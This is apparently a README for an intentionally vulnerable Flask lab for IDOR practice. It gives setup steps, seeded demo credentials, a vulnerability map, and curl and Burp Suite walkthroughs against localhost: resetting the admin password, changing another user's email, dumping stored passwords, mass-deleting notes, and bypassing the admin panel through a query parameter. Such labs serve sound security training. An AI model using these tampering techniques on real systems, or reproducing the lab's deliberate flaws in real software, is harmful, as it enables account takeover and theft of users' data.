# 🔓 IDOR Vulnerability Lab

> **⚠️ WARNING: This application is INTENTIONALLY INSECURE.**
> Built exclusively for security research and Burp Suite practice.
> **Never deploy on a public server or production environment.**

<div align="center">

![Python](https://img.shields.io/badge/Python-3.8%2B-blue?logo=python)
![Flask](https://img.shields.io/badge/Flask-3.x-black?logo=flask)
![SQLite](https://img.shields.io/badge/SQLite-3-blue?logo=sqlite)
![License](https://img.shields.io/badge/License-MIT-green)
![Status](https://img.shields.io/badge/Status-Active-brightgreen)

**A deliberately vulnerable Flask web application with 10 IDOR vulnerabilities for hands-on bug hunting practice.**

[Getting Started](#-installation) · [Vulnerabilities](#-vulnerability-map) · [Practice Guide](#-practice-guide) · [Burp Suite Tips](#-burp-suite-tips)

</div>

---

## 📖 What is IDOR?

**Insecure Direct Object Reference (IDOR)** is a type of access control vulnerability where an application uses user-controllable input to access objects directly without verifying that the user has permission to access the requested resource.

Example:
```
# You are logged in as user 2
GET /profile?id=2        ✅  Your profile
GET /profile?id=1        ❌  Should be forbidden — but in this lab, it works
GET /profile?id=3        ❌  Should be forbidden — admin profile leaked
```

This lab contains **10 real IDOR vulnerabilities** across profiles, notes, files, APIs, and admin panels — exactly what you will encounter on real bug bounty targets.

---

## 🗂️ Project Structure

```
IDOR_vuln_LAB/
├── app.py                  ← Main Flask application (all routes + vulnerabilities)
├── database.db             ← SQLite database (auto-created on first run)
├── requirements.txt        ← Python dependencies
├── uploads/                ← File upload directory (auto-created)
└── templates/              ← HTML templates
    ├── index.html
    ├── login.html
    ├── signup.html
    ├── profile.html
    ├── notes.html
    ├── upload.html
    ├── files.html
    └── admin.html
```

---

## 🚀 Installation

### Prerequisites

| Tool | Version | Purpose |
|------|---------|---------|
| Python | 3.8+ | Runtime |
| pip | Latest | Package manager |
| Git | Any | Clone the repo |
| Burp Suite | Community/Pro | Intercept & test |

---

### 🐧 Linux (Ubuntu / Debian / Kali)

#### Method 1 — Step by Step

```bash
# Step 1: Update package lists
sudo apt update

# Step 2: Install Python and pip (skip if already installed)
sudo apt install python3 python3-pip python3-venv -y

# Verify installation
python3 --version   # Should show Python 3.8 or higher
pip3 --version

# Step 3: Clone the repository
git clone https://github.com/CyberBros435/IDOR_vuln_LAB.git
cd IDOR_vuln_LAB

# Step 4: Create a virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate

# You should see (venv) in your terminal prompt now

# Step 5: Install dependencies
pip install -r requirements.txt

# Step 6: Run the application
python3 app.py
```

✅ Open your browser → `http://127.0.0.1:5000`

**Common errors and fixes:**

| Error | Fix |
|-------|-----|
| `python3: command not found` | `sudo apt install python3 -y` |
| `pip3: command not found` | `sudo apt install python3-pip -y` |
| `ModuleNotFoundError: flask` | `pip install -r requirements.txt` |
| `Address already in use` | Kill the process: `fuser -k 5000/tcp` then retry |
| `venv: command not found` | `sudo apt install python3-venv -y` |

#### Method 2 — One Command

```bash
git clone https://github.com/CyberBros435/IDOR_vuln_LAB.git && cd IDOR_vuln_LAB && python3 -m venv venv && source venv/bin/activate && pip install -r requirements.txt && python3 app.py
```

---

### 🪟 Windows (10 / 11)

#### Method 1 — Step by Step

```powershell
# Step 1: Install Python from https://python.org/downloads
# During install — CHECK "Add Python to PATH" checkbox

# Step 2: Verify installation (open Command Prompt or PowerShell)
python --version    # Should show Python 3.8 or higher
pip --version

# Step 3: Clone the repository
git clone https://github.com/CyberBros435/IDOR_vuln_LAB.git
cd IDOR_vuln_LAB

# Step 4: Create a virtual environment
python -m venv venv

# Step 5: Activate the virtual environment
venv\Scripts\activate

# You should see (venv) in your prompt now

# Step 6: Install dependencies
pip install -r requirements.txt

# Step 7: Run the application
python app.py
```

✅ Open your browser → `http://127.0.0.1:5000`

**Common errors and fixes:**

| Error | Fix |
|-------|-----|
| `'python' is not recognized` | Reinstall Python and check "Add to PATH" |
| `'git' is not recognized` | Download Git from https://git-scm.com |
| `ExecutionPolicy error` | Run: `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser` |
| `ModuleNotFoundError: flask` | Run: `pip install -r requirements.txt` |
| `Port 5000 in use` | Run: `netstat -ano \| findstr :5000` then `taskkill /PID <PID> /F` |

#### Method 2 — One Command (PowerShell)

```powershell
git clone https://github.com/CyberBros435/IDOR_vuln_LAB.git; cd IDOR_vuln_LAB; python -m venv venv; venv\Scripts\activate; pip install -r requirements.txt; python app.py
```

---

### 🍎 macOS (Monterey / Ventura / Sonoma)

#### Method 1 — Step by Step

```bash
# Step 1: Install Homebrew (if not already installed)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Step 2: Install Python via Homebrew
brew install python

# Verify
python3 --version
pip3 --version

# Step 3: Clone the repository
git clone https://github.com/CyberBros435/IDOR_vuln_LAB.git
cd IDOR_vuln_LAB

# Step 4: Create a virtual environment
python3 -m venv venv
source venv/bin/activate

# Step 5: Install dependencies
pip install -r requirements.txt

# Step 6: Run the application
python3 app.py
```

✅ Open your browser → `http://127.0.0.1:5000`

**Common errors and fixes:**

| Error | Fix |
|-------|-----|
| `xcrun: error` | Run: `xcode-select --install` |
| `brew: command not found` | Install Homebrew from https://brew.sh |
| `Port 5000 in use` | macOS uses 5000 for AirPlay. Fix: `lsof -ti:5000 \| xargs kill` or change port in `app.py` to 8080 |
| `SSL errors` | `pip install --upgrade certifi` |

#### Method 2 — One Command

```bash
git clone https://github.com/CyberBros435/IDOR_vuln_LAB.git && cd IDOR_vuln_LAB && python3 -m venv venv && source venv/bin/activate && pip install -r requirements.txt && python3 app.py
```

> **macOS note:** If port 5000 is taken by AirPlay Receiver, go to System Settings → General → AirDrop & Handoff → disable AirPlay Receiver, or change the port in `app.py` line at the bottom to `port=8080`.

---

## 🔑 Demo Accounts

The database is pre-seeded with these accounts on first run:

| Username | Password | Role |
|----------|----------|------|
| `user1` | `password1` | Regular user |
| `user2` | `password2` | Regular user |
| `admin` | `adminpass` | Administrator |

> Login at `http://127.0.0.1:5000/login`

---

## 🗺️ Vulnerability Map

| # | Endpoint | Method | Vulnerability | Severity |
|---|----------|--------|---------------|----------|
| 1 | `/profile?id=X` | GET | IDOR — view any user's profile | 🟡 Medium |
| 2 | `/notes?user_id=X` | GET | IDOR — read any user's notes | 🔴 High |
| 3 | `/create_note` | POST | IDOR — create note as any user | 🔴 High |
| 4 | `/edit_note?id=X` | GET/POST | IDOR — edit any user's note | 🔴 High |
| 5 | `/delete_note?id=X` | GET | IDOR — delete any note | 🔴 High |
| 6 | `/download?file_id=X` | GET | IDOR — download any user's file | 🔴 High |
| 7 | `/admin?role=admin` | GET | Broken Access Control — trivial bypass | 🔴 Critical |
| 8 | `/api/update_email` | POST | IDOR — update any user's email | 🔴 High |
| 9 | `/api/delete_notes` | POST | IDOR — mass delete any notes | 🔴 High |
| 10 | `/api/users/<id>/notes/<id>` | GET/PUT/DELETE | IDOR — nested object no auth check | 🔴 High |
| 11 | `/api/change_password` | POST | Blind IDOR — change any password | 🔴 Critical |
| 12 | `/api/users` | GET | Sensitive Data Exposure — all passwords leaked | 🔴 Critical |

---

## 🎯 Practice Guide

### Beginner — Profile IDOR

```
1. Log in as user1
2. Visit: http://127.0.0.1:5000/profile?id=1
3. Now change id to 2: http://127.0.0.1:5000/profile?id=2
4. Change id to 3: http://127.0.0.1:5000/profile?id=3
```
**Goal:** Read admin's email address without being admin.

---

### Intermediate — Notes IDOR

```
1. Log in as user1
2. Visit: http://127.0.0.1:5000/notes?user_id=1  (your notes)
3. Change user_id to 2: http://127.0.0.1:5000/notes?user_id=2
4. Change user_id to 3: http://127.0.0.1:5000/notes?user_id=3
```
**Goal:** Read user2's bank PIN and admin's server credentials.

---

### Intermediate — File Download IDOR

```
1. Log in as user1
2. Visit: http://127.0.0.1:5000/download?file_id=1 (your file)
3. Change file_id to 2, then 3
```
**Goal:** Download admin_secrets.txt without being admin.

---

### Advanced — Admin Panel Bypass

```
# In browser
http://127.0.0.1:5000/admin?role=admin

# Or with curl
curl "http://127.0.0.1:5000/admin?role=admin"
```
**Goal:** Access the full admin panel with all users, notes, and files — without any admin credentials.

---

### Advanced — API IDOR (use Burp Suite or curl)

**Change another user's email:**
```bash
curl -X POST http://127.0.0.1:5000/api/update_email \
  -H "Content-Type: application/json" \
  -d '{"user_id": 3, "email": "hacked@evil.com"}'
```

**Change admin's password (Blind IDOR):**
```bash
curl -X POST http://127.0.0.1:5000/api/change_password \
  -H "Content-Type: application/json" \
  -d '{"user_id": 3, "new_password": "pwned123"}'
```

**Dump all users including passwords:**
```bash
curl http://127.0.0.1:5000/api/users
```

**Mass delete notes:**
```bash
curl -X POST http://127.0.0.1:5000/api/delete_notes \
  -H "Content-Type: application/json" \
  -d '{"ids": [1, 2, 3, 4, 5, 6]}'
```

---

## 🔧 Burp Suite Tips

### Setup (Intercept the Lab)

1. Open Burp Suite → Proxy → turn Intercept ON
2. Set your browser to use proxy: `127.0.0.1:8080`
3. Visit `http://127.0.0.1:5000` — requests appear in Burp

### Key Techniques to Practice

**Parameter tampering:**
- Intercept any request → send to Repeater (Ctrl+R)
- Change `id`, `user_id`, `file_id` values
- Observe responses for data belonging to other users

**IDOR enumeration with Intruder:**
- Intercept `/notes?user_id=1` → send to Intruder
- Set payload position on the `1`: `user_id=§1§`
- Payload type: Numbers 1–10
- Start attack — compare response lengths for valid IDs

**API testing:**
- Send API requests to Repeater
- Modify `user_id` in JSON body
- Check if session validation exists (it doesn't in this lab)

---

## 🧠 What You Learn

After completing this lab you will be able to:

- Identify IDOR vulnerabilities in GET parameters, POST body, and REST APIs
- Exploit horizontal privilege escalation (user → user)
- Exploit vertical privilege escalation (user → admin)
- Detect blind IDOR (no visible response difference)
- Recognize missing authentication on API endpoints
- Write proper IDOR bug reports for bug bounty submissions

---

## 📝 Bug Report Template

Use this template when writing up IDOR findings on real targets:

```
Title: IDOR in [endpoint] allows access to other users' [data]

Severity: High

Description:
The [endpoint] parameter [param_name] is not validated against the
authenticated user's session, allowing any authenticated user to
access resources belonging to other users.

Steps to Reproduce:
1. Log in as user A
2. Send request: GET /endpoint?id=<user_B_id>
3. Observe response contains user B's data

Impact:
An attacker can read/modify/delete data belonging to any user,
including administrators.

Affected Endpoint: /endpoint?id=X
Parameter: id
HTTP Method: GET
Authentication Required: Yes (but not enforced on ownership)

Request:
GET /endpoint?id=2 HTTP/1.1
Host: target.com
Cookie: session=<user_A_session>

Response:
HTTP/1.1 200 OK
{ "user": "user2", "email": "user2@example.com", ... }
```

---

## 🛠️ Known Issues in This Lab

| Issue | Location | Notes |
|-------|----------|-------|
| Passwords stored in plaintext | `signup()` route | Intentional — shows real-world risk |
| Session stores full user row including password | `login()` route | Sensitive data in cookie |
| File upload has no sanitization | `upload()` route | Path traversal possible |
| Debug mode enabled | `app.run()` | Exposes Werkzeug debugger — lab only |
| `/api/users` returns passwords | API route | Intentional sensitive data exposure |

---

## ⚖️ Legal & Ethics

This lab is for **educational use only** on your **own local machine**.

- ✅ Use on `localhost` / `127.0.0.1` only
- ✅ Use for learning, CTFs, and training
- ❌ Never deploy publicly
- ❌ Never use these techniques on systems you don't own
- ❌ Never use against real targets without written permission

Unauthorized testing of real systems is illegal under the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act (UK), and equivalent laws worldwide.

---

## 🤝 Contributing

Pull requests are welcome. For major changes, open an issue first.

1. Fork the repo
2. Create your branch: `git checkout -b feature/new-vuln`
3. Commit: `git commit -m "Add SSRF vulnerability endpoint"`
4. Push: `git push origin feature/new-vuln`
5. Open a Pull Request

---

## 📚 Resources

- [OWASP IDOR Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [PortSwigger IDOR Labs](https://portswigger.net/web-security/access-control/idor)
- [HackTricks IDOR](https://book.hacktricks.xyz/pentesting-web/idor)
- [Bug Bounty Tips — IDOR](https://www.bugcrowd.com/blog/how-to-find-idor-vulnerabilities/)

---

<div align="center">

Made for the bug hunting community · **CyberBros435**

⭐ Star this repo if it helped you learn!

</div>
